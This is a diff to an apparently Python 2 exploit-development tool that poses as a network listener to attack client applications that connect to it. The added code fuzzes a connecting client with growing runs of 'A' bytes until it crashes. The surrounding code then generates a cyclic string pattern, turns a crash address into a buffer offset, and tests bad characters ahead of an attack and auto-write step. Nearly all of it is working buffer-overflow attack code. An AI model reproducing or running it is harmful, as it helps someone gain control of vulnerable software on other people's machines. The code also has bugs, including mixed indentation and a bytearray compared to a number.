@@ -11,6 +11,9 @@ import shutil
 import fileinput
 from subprocess import check_output 
 import os
+import sys
+
+
 
 W='\033[0m'     
 R='\033[31m'    
@@ -41,12 +44,13 @@ class LISTEN_BIND():
              print R+mode+W          
              time.sleep(1)
              self.app_name = str(raw_input(O+"\n[*] "+W+P+"application name : "+W))  
-             banner2=Y+'\n\t\tLISTNER OPTIONS'+'\n\t   '+('='*22)
+             banner2=Y+'\n\t\tLISTNER OPTIONS'+'\n\t   '+('='*22)+W
              print banner2
              time.sleep(1)
-             print Y+"\n\r\r!---___"+W+P+ "defulat_listner_ip"+W+O+ " 0.0.0.0 "+W+Y+'___---!'+W   
-             time.sleep(1)
-             self.listner_port=int(raw_input(O+"\n[+] "+W+B+"Port listner : "+W))      
+             print O+'\n[*] '+W+O+'Listner Ip = '+W+O+'0.0.0.0'+W
+             time.sleep(1)  
+             self.listner_port=int(raw_input(O+"\n[+] "+W+B+"Port listner : "+W))  
+             self.Fuzzing__()    
              self.string_ramd() 
              self.Listen_FAKE()
              self.connect_client()
@@ -56,6 +60,71 @@ class LISTEN_BIND():
              self.import_char()             
              self.attack()
              self.auto_write()
+      def Fuzzing__(self):     				
+          try:                  
+                self.Fuz_skip = 's'.lower() 
+                self.Fuz_OPt  = "y".lower()  
+                time.sleep(2)           
+                banner2=Y+'\n\t\tFUZZING OPTIONS'+'\n\t   '+('='*22)
+                print banner2
+                time.sleep(2) 
+                self.Fuzzing_in = str(raw_input(O+"\n[$] "+W+B+"Start Fuzzing Enter " +W+Y+"'Y'" +W+B+ " skip Enter " +W+Y+"'S'"+W+B+' : '+W))               
+                if self.Fuzzing_in ==self.Fuz_skip and len(self.Fuzzing_in)==1:
+                     pass
+                
+                elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
+                    String = "A"
+		    fizzing= ''
+                    acount = 100 		    
+		    try:
+		        Fuzzing_S =  socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                        Fuzzing_S.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        Fuzzing_S.bind(('0.0.0.0',self.listner_port))
+                        Fuzzing_S.listen(0)
+                        print Y+"\n\r\r!---___"+W+R+ "Wating For incoming Connection"+W+Y+'___---!'+W 
+                        client,addr = Fuzzing_S.accept()
+                        print Y+"\n\r\r!---___"+W+R+"Fizzing Connection Accept From "+W+'%s:'%(addr[0],),P+'___---!'+W 
+                        client.settimeout(5)
+                        acount  = 100
+                        payload = 'A'
+                        fizzing  = ''
+                        print Y+"\n\r\r!---___"+W+O+ "Fuzzing in process"+W+Y+'___---!\n'+W
+                        for i in range(10000):
+                              client.send(fizzing+"\n\r") 
+                              acount +=100
+                              fizzing  = payload*acount 
+                              print B+"###--> fizzing Send Byte "+W,acount   
+                              sys.stdout.write('\x1b[1A')
+                              sys.stdout.write('\x1b[2K')
+                              time.sleep(0.30)
+		    except:
+                          print O+"\n[*] "+W+P+"Fuzzing Stop at " +W+Y+str(acount)+W+ R+ " Bytes"+W 
+                          time.sleep(1)
+                          Fuzzing_S .close()
+
+                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(acount))).lower()  
+                    self.Random_String = bytearray(self.Random_String)
+                    time.sleep(2)
+                    banner2=Y+'\n\t\tString Pattern'+'\n\t   '+('='*22)
+                    print banner2
+                    print Y+"\n\r\r!---___"+W+R+ "String Pattern is Generated in length : "+W,len(self.Random_String)
+                    time.sleep(2)  
+                    if self.Random_String  > 100: 
+                       self.Listen_FAKE()
+                       self.connect_client()
+                       self.option_ret()
+                       self._hexadecimal()
+                       self.little_endian()
+                       self.import_char()             
+                       self.attack()
+                       self.auto_write()                                                                                                                    
+	        else:         
+	           time.sleep(2)    
+                   print Y+"\n[-] "+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
+                   return self.Fuzzing__()             
+          except KeyboardInterrupt:
+                    print  Banner
+                    exit()
       def Listen_FAKE(self):
           try:                   
               self.ip_server = "0.0.0.0"
@@ -85,7 +154,7 @@ class LISTEN_BIND():
 	      time.sleep(1)
 	      self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(self.Requst_String )).lower()  
               self.Random_String = bytearray(self.Random_String)
-              print Y+"\n\r\r!---___"+W+R+ "String Pattern is Generated in length  : "+W,len(self.Random_String ) 
+              print Y+"\n\r\r!---___"+W+R+ "String Pattern is Generated in fizzing  : "+W,len(self.Random_String ) 
 	      print
           except Exception:
               time.sleep(1)
@@ -105,8 +174,11 @@ class LISTEN_BIND():
                           print Y+"\n\r\r!---___"+W+R+ "Data Send Successful"+W+Y+'___---!'+W                           
                           time.sleep(1)
                           print Y+"\n\r\r!---___"+W+P+ "Buffer OverFlow discover"+W+Y+'___---!'+W 
-                          time.sleep(1) 
-                          input= raw_input(O+"\n\t\t!_________application  not repoinding restart then Press any key to Continue________! \n"+W) 
+                          time.sleep(1)
+                          try:
+                             input= raw_input(O+"\n\t\t!_________application  not repoinding restart then Press any key to Continue________! \n"+W)
+                          except NameError:
+                               pass	                   
           except KeyboardInterrupt:
                    print Banner
                    exit()
@@ -135,15 +207,15 @@ class LISTEN_BIND():
           print banner2                                                                         
           while True:
                  try: 
-		    self.hexadecimal =str(raw_input(O+"\n[+]"+W+B+"Enter hexadecimal Crach address: "+W)).upper()
+		    self.hexadecimal =str(raw_input(O+"\n[+] "+W+B+"Enter hexadecimal Crach address: "+W)).upper()
                     self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
 		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
 		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
 		       time.sleep(2)
-		       print Y+"\n[+]"+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
+		       print Y+"\n[+] "+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
 		       time.sleep(2)
 		       self.location = self.Random_String.find(self.ASCII)		       
-		       print Y+"\n[+]"+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
+		       print Y+"\n[+] "+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                        break
 		    else:
 	               print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+'___---!'+W
@@ -164,7 +236,7 @@ class LISTEN_BIND():
             print banner2   
             Bad = "yes".lower()
             Bad_no = "no".lower()                 
-            bad_op = str(raw_input(Y+"\n[<>]"+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
+            bad_op = str(raw_input(Y+"\n[+] "+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
             
             if bad_op == Bad and len(Bad)==3: 
                 self.listen_sock.close()
